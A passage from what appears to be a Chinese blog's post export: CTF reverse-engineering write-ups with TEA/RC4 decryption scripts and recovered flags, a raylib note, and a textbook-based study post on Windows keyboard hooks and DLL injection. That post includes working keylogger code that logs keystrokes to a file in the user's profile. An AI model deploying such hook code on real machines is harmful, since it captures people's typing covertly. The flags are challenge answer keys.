<span class="number">3</span>] + sum) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">target[i] = v6;</span><br><span class="line">target[i + <span class="number">1</span>] = v5;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//void __cdecl sub_A71A10(unsigned int round, DWORD* target, DWORD* key)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//unsigned int j; // [esp+4Ch] [ebp-18h]</span></span><br><span class="line"><span class="comment">//unsigned int sum; // [esp+54h] [ebp-10h]</span></span><br><span class="line"><span class="comment">//unsigned int v5; // [esp+58h] [ebp-Ch]</span></span><br><span class="line"><span class="comment">//unsigned int v6; // [esp+5Ch] [ebp-8h]</span></span><br><span class="line"><span class="comment">//int i; // [esp+60h] [ebp-4h]</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for (i = 0; i &lt; 16; i += 2)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 = target[i];</span></span><br><span class="line"><span class="comment">//v5 = target[i + 1];</span></span><br><span class="line"><span class="comment">//sum = 0;</span></span><br><span class="line"><span class="comment">//for (j = 0; j &lt; round; ++j)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 += (key[sum &amp; 3] + sum) ^ (v5 + ((v5 &gt;&gt; 5) ^ (16 * v5)));</span></span><br><span class="line"><span class="comment">//sum -= 0x61C88647;</span></span><br><span class="line"><span class="comment">//v5 += (key[(sum &gt;&gt; 11) &amp; 3] + sum) ^ (v6 + ((v6 &gt;&gt; 5) ^ (16 * v6)));</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//target[i] = v6;</span></span><br><span class="line"><span class="comment">//target[i + 1] = v5;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">swap</span><span class="params">(BYTE* a1, BYTE* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> v2; <span class="comment">// [esp+4Fh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">v2 = *a1;</span><br><span class="line">*a1 = *a2;</span><br><span class="line">*a2 = v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">Sini</span><span class="params">(BYTE* a1, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> k; <span class="comment">// [esp+4Ch] [ebp-114h]</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// [esp+50h] [ebp-110h]</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [esp+54h] [ebp-10Ch]</span></span><br><span class="line"><span class="type">char</span> v5[<span class="number">256</span>]; <span class="comment">// [esp+58h] [ebp-108h] BYREF</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+158h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i)</span><br><span class="line">S[i] = i;</span><br><span class="line"><span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="built_in">sizeof</span>(v5));</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">v5[j] = a1[j % len];</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k)</span><br><span class="line">&#123;</span><br><span class="line">v3 = ((<span class="type">unsigned</span> __int8)v5[k] + v3 + (<span class="type">unsigned</span> __int8)S[k]) % <span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(&amp;S[k], &amp;S[v3]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">decrc4</span><span class="params">(BYTE* target, <span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">char</span>* a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+4Ch] [ebp-14h]</span></span><br><span class="line"><span class="type">int</span> v6; <span class="comment">// [esp+54h] [ebp-Ch]</span></span><br><span class="line"><span class="type">int</span> v7; <span class="comment">// [esp+58h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line">v6 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">Sini</span>(a3, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v7 = (v7 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v6 = (v6 + (<span class="type">unsigned</span> __int8)S[v7]) % <span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(&amp;S[v7], &amp;S[v6]);</span><br><span class="line">target[i] ^= S[((<span class="type">unsigned</span> __int8)S[v6] + (<span class="type">unsigned</span> __int8)S[v7]) % <span class="number">256</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> last[<span class="number">64</span>] = &#123;</span><br><span class="line"><span class="number">0x59</span>, <span class="number">0x1B</span>, <span class="number">0xFD</span>, <span class="number">0xB4</span>, <span class="number">0x6B</span>, <span class="number">0xB8</span>, <span class="number">0xBE</span>, <span class="number">0xD9</span>, <span class="number">0xB3</span>, <span class="number">0xD3</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0xF0</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x18</span>,</span><br><span class="line"><span class="number">0xA0</span>, <span class="number">0x9D</span>, <span class="number">0x3A</span>, <span class="number">0x53</span>, <span class="number">0x6D</span>, <span class="number">0x4A</span>, <span class="number">0x7B</span>, <span class="number">0x26</span>, <span class="number">0x74</span>, <span class="number">0x3A</span>, <span class="number">0x9C</span>, <span class="number">0x4E</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x19</span>, <span class="number">0xD8</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xED</span>, <span class="number">0x95</span>, <span class="number">0xB5</span>, <span class="number">0x9C</span>, <span class="number">0x05</span>, <span class="number">0x22</span>, <span class="number">0x56</span>, <span class="number">0xCB</span>, <span class="number">0x7A</span>, <span class="number">0x11</span>, <span class="number">0x91</span>, <span class="number">0x9F</span>, <span class="number">0x7A</span>, <span class="number">0xBC</span>, <span class="number">0x0C</span>,</span><br><span class="line"><span class="number">0x4A</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0xCE</span>, <span class="number">0x3D</span>, <span class="number">0xB4</span>, <span class="number">0xAB</span>, <span class="number">0x29</span>, <span class="number">0x61</span>, <span class="number">0xFA</span>, <span class="number">0x62</span>, <span class="number">0x32</span>, <span class="number">0xB4</span>, <span class="number">0xEC</span>, <span class="number">0x4C</span>, <span class="number">0xB6</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x0CAA5BDD</span>, <span class="number">0xD6846924</span>, <span class="number">0x51041EB8</span>, <span class="number">0x8B2AAB06</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decTEA</span>((<span class="type">unsigned</span>*)last, key);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ikey[<span class="number">16</span>] = &#123;</span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x89</span>, <span class="number">0x33</span>, <span class="number">0x49</span>, <span class="number">0x19</span>, <span class="number">0x13</span>, <span class="number">0xC3</span>, <span class="number">0xC7</span>, <span class="number">0xAD</span>, <span class="number">0xD8</span>, <span class="number">0xE4</span>, <span class="number">0x68</span>, <span class="number">0xFC</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0xBC</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decrc4</span>(last, <span class="number">64</span>, ikey);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; (<span class="type">unsigned</span> <span class="type">char</span>)last[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// C+vFCnHRGPghbmyQMXvFMRNd7fNCG8jcU+jcbnjRJTj2GTCOGUvgtOS0CTge7fNs</span></span><br></pre></td></tr></table></figure><p>对着码表直接解密</p><p>4yZRiNP8LoK/GSA5ElWkUjXtJCz7bMYcuFfpm6+hV0rxeHIdwv32QOTnqg1BDsa9</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C0ngr<span class="meta">@tulat</span>1<span class="keyword">on</span>!Y0u_Re_suCces3fu1Ly_Signln!&#125;</span><br></pre></td></tr></table></figure><h2 id="bedTEA">bedTEA</h2><p>观察main逻辑，先用一个奇怪算法生成了key，然后执行XTEA加密，一共三次，这里没看懂奇怪算法是什么，但是好像跟输入无关，于是尝试动调，出来后发现是斐波那契数列，用这个写tea脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">may_ini</span><span class="params">(DWORD* input, DWORD* key_array)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> key_index; <span class="comment">// 对应于原代码中的 v1</span></span><br><span class="line"><span class="type">int</span> key_end; <span class="comment">// 对应于原代码中的 v3</span></span><br><span class="line"><span class="type">int</span> temp_key_index; <span class="comment">// 对应于原代码中的 v4</span></span><br><span class="line"><span class="type">int</span> temp1, temp2, temp3, temp4, temp5; <span class="comment">// 对应于原代码中的 v5, v6, v7, v8, v9</span></span><br><span class="line"><span class="type">int</span> temp6; <span class="comment">// 对应于原代码中的 v10</span></span><br><span class="line"><span class="type">int</span> temp7; <span class="comment">// 对应于原代码中的 v11</span></span><br><span class="line"><span class="type">int</span> key_value; <span class="comment">// 对应于原代码中的 v12</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> input_second; <span class="comment">// 对应于原代码中的 v13</span></span><br><span class="line"><span class="type">int</span> delta; <span class="comment">// 对应于原代码中的 v14</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> input_first; <span class="comment">// 对应于原代码中的 v15</span></span><br><span class="line"><span class="type">int</span> key = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">input_second = input[<span class="number">1</span>];</span><br><span class="line">delta = <span class="number">0x987E55D0</span>;</span><br><span class="line">input_first = *input;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">input_second -= (delta + input_first) ^ (key_array[<span class="number">3</span>] + (input_first &gt;&gt; <span class="number">4</span>)) ^ (key_array[<span class="number">2</span>] + <span class="number">32</span> * input_first);</span><br><span class="line">input_first -= (delta + input_second) ^ (key_array[<span class="number">1</span>] + (input_second &gt;&gt; <span class="number">4</span>)) ^ (key_array[<span class="number">0</span>] + <span class="number">32</span> * input_second);</span><br><span class="line"></span><br><span class="line">delta += <span class="number">0x61CBB648</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (delta != <span class="number">0</span>);</span><br><span class="line">*input = input_first;</span><br><span class="line">input[<span class="number">1</span>] = input_second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">BYTE last[] = &#123; <span class="number">211</span>, <span class="number">109</span>, <span class="number">186</span>, <span class="number">193</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">42</span>, <span class="number">137</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">245</span>, <span class="number">49</span>, <span class="number">250</span>, <span class="number">190</span>, <span class="number">194</span>, <span class="number">49</span>, <span class="number">144</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">67</span>, <span class="number">212</span>, <span class="number">174</span>, <span class="number">66</span>, <span class="number">69</span> , <span class="number">0</span>&#125;;</span><br><span class="line">BYTE data[<span class="number">24</span>] = &#123;</span><br><span class="line"><span class="number">0xF7</span>, <span class="number">0xA1</span>, <span class="number">0x04</span>, <span class="number">0xD8</span>, <span class="number">0xD3</span>, <span class="number">0xF7</span>, <span class="number">0x2F</span>, <span class="number">0x25</span>, <span class="number">0x06</span>, <span class="number">0x91</span>, <span class="number">0xF9</span>, <span class="number">0xEC</span>, <span class="number">0xDD</span>, <span class="number">0x03</span>, <span class="number">0xC8</span>, <span class="number">0xA9</span>,</span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x84</span>, <span class="number">0xF0</span>, <span class="number">0xFE</span>, <span class="number">0xAF</span>, <span class="number">0x4E</span>, <span class="number">0xDF</span>, <span class="number">0xD1</span></span><br><span class="line">&#125;;</span><br><span class="line">DWORD rkey[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000D</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last, rkey);</span><br><span class="line">DWORD rkey2[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000015</span>, <span class="number">0x00000022</span>, <span class="number">0x00000037</span>, <span class="number">0x00000059</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last + <span class="number">2</span>, rkey2);</span><br><span class="line">DWORD rkey3[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000090</span>, <span class="number">0x000000E9</span>, <span class="number">0x00000179</span>, <span class="number">0x00000262</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last + <span class="number">4</span>, rkey3);</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tea流程之后后面好像xor了好多东西，把每个地址都改名</p><p><img src="https://s2.loli.net/2024/07/07/ZAy7cQHEmurkDh2.png" alt="image-20240707151103500"></p><p>然后对最后检查的地址下读写断点，发现第一次写入时是倒序传入</p><p>然后异或了0x33</p><p>那么把最后的值倒序然后异或，然后解密tea即可得到flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="symbol">y0u_reallyl1ke_te@</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>raylib学习</title>
      <link href="/posts/aa7cf3e8.html"/>
      <url>/posts/aa7cf3e8.html</url>
      
        <content type="html"><![CDATA[<p>由于C语言工程实践要用图形化界面，所以我准备开始学一下raylib<br>因为我觉得很好看</p><p>下载方式：</p><p><a href="https://www.raylib.com/">raylib | A simple and easy-to-use library to enjoy videogames programming</a></p><p>它本身不是单纯的图形库，而是集成的游戏开发工具</p><p>其中的raygui才是我这次准备学的重点</p><p>编译：</p><p><a href="https://blog.csdn.net/qq_37661242/article/details/123279843">VSCode + Mingw安装raylib_raylib安装-CSDN博客</a></p><p>要使用图形库时</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> RAYGUI_IMPLEMENTATION</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;raygui.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>然后尝试用内置的操作写代码，使用vscode和cmake，测试成功</p><p>至于vs，之后再试。</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》07-键盘hook和DLL注入</title>
      <link href="/posts/8535f1d8.html"/>
      <url>/posts/8535f1d8.html</url>
      
        <content type="html"><![CDATA[<p>之前尝试过对函数的hook，这次参考了《逆向工程核心原理》，尝试使用windows的系统函数在系统层面对message进行hook</p><hr><h2 id="消息">消息</h2><p>Windows是以事件驱动来工作的。每当用户执行一个操作，都会让OS把对应的消息发送给相应的应用程序。</p><p>每个消息都是一个结构，其中的message是对应的消息类别，32位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMsg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       HWND    hwnd;       <span class="comment">//接受该消息的窗口句柄</span></span><br><span class="line">       UINT    message;    <span class="comment">//消息常量标识符，也就是我们通常所说的消息号</span></span><br><span class="line">       WPARAM  wParam;     <span class="comment">//32位消息的特定附加信息，确切含义依赖于消息值</span></span><br><span class="line">       LPARAM  lParam;     <span class="comment">//32位消息的特定附加信息，确切含义依赖于消息值</span></span><br><span class="line">       DWORD   time;       <span class="comment">//消息创建时的时间</span></span><br><span class="line">       POINT   pt;         <span class="comment">//消息创建时的鼠标/光标在屏幕坐标系中的位置</span></span><br><span class="line">&#125;MSG;</span><br></pre></td></tr></table></figure><p>标识符：</p><blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WM_NULL<span class="comment">---0x0000    空消息。</span></span><br><span class="line"><span class="number">0</span>x0001<span class="comment">----0x0087    主要是窗口消息。</span></span><br><span class="line"><span class="number">0</span>x00A0<span class="comment">----0x00A9    非客户区消息 </span></span><br><span class="line"><span class="number">0</span>x0100<span class="comment">----0x0108    键盘消息</span></span><br><span class="line"><span class="number">0</span>x0111<span class="comment">----0x0126    菜单消息</span></span><br><span class="line"><span class="number">0</span>x0132<span class="comment">----0x0138    颜色控制消息</span></span><br><span class="line"><span class="number">0</span>x0200<span class="comment">----0x020A    鼠标消息</span></span><br><span class="line"><span class="number">0</span>x0211<span class="comment">----0x0213    菜单循环消息</span></span><br><span class="line"><span class="number">0</span>x0220<span class="comment">----0x0230    多文档消息</span></span><br><span class="line"><span class="number">0</span>x03E0<span class="comment">----0x03E8    DDE消息</span></span><br><span class="line"><span class="number">0</span>x0400             WM_USER</span><br><span class="line"><span class="number">0</span>x8000             WM_APP</span><br><span class="line"><span class="number">0</span>x0400<span class="comment">----0x7FFF    应用程序自定义私有消息</span></span><br></pre></td></tr></table></figure></blockquote><p>消息分为：</p><ul><li>窗口消息：对窗口的操作触发窗口消息：创建窗口，移动窗口，单机鼠标</li><li>命令消息：属于窗口消息，处理从一个窗口发送到另一个窗口的用户请求，比如按下按钮</li><li>控件通知消息：用于子窗口通知父窗口</li></ul><p>每一个程序在执行后，都存在一个消息队列，进程通过第一次调用GDI函数创建一个队列。所有消息都存放在这个队列中，应用程序通过一个消息循环，读取其中的消息并响应。消息队列分为系统消息队列和线程消息队列，系统消息队列由Windows维护，线程消息队列由GUI线程维护。</p><p>以鼠标点击举例：</p><p>当鼠标点击时，驱动创建对应的消息传送到系统消息队列。当有应用要读取时，系统从系统队列中把对应的消息取出，传给对应的线程消息队列。线程在消息的读取循环中把消息拿出来，通过操作系统发送到对应窗口过程处理。</p><hr><h2 id="hook">hook</h2><p>hook，就是在它们传递过程中插入自己的代码的操作。</p><p>现在用键盘钩子举例</p><p>重要的函数有以下几个：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetWindowsHookEx</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);<span class="comment">//创建一个钩子</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);<span class="comment">//删除一个钩子</span></span><br></pre></td></tr></table></figure><p>我们要调用这个api执行钩子操作，可以直接把这个写到exe里面，但是这样就是exe监听其它的，而不是直接把dll放进去，所以把这两个函数写到dll里面并添加dllexport关键字作为导出函数，这样就可以被其它进程访问，我们可以专门写一个exe去执行它</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">HookStart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_hHook = <span class="built_in">SetWindowsHookExA</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">HookStop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_hHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后再写钩子的回调函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeToFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span>* user_dir = <span class="built_in">getenv</span>(<span class="string">&quot;USERPROFILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (user_dir != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="type">char</span> file_path[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">snprintf</span>(file_path, <span class="built_in">sizeof</span>(file_path), <span class="string">&quot;%s\\outputkey.txt&quot;</span>, user_dir);</span><br><span class="line">FILE* fl = <span class="built_in">fopen</span>(file_path, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fl != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">fwrite</span>(str, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(str), fl);</span><br><span class="line"><span class="built_in">fclose</span>(fl);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> ch[<span class="number">15</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (((DWORD)lParam &amp; <span class="number">0x80000000</span>) &amp;&amp; (HC_ACTION == nCode)) &#123;</span><br><span class="line"><span class="keyword">switch</span> (wParam) &#123;</span><br><span class="line"><span class="keyword">case</span> VK_RETURN:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ENTER]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_BACK:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[BCAKSPACE]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_TAB:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[TAB]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_MENU: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ALT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_ESCAPE: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ESC]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_DELETE: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[DELETE]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LEFT: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[LEFT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_UP: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[RIGHT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RIGHT: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[RIGHT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_DOWN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[DOWN]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LWIN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[WIN KEY]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RWIN: &#123; <span 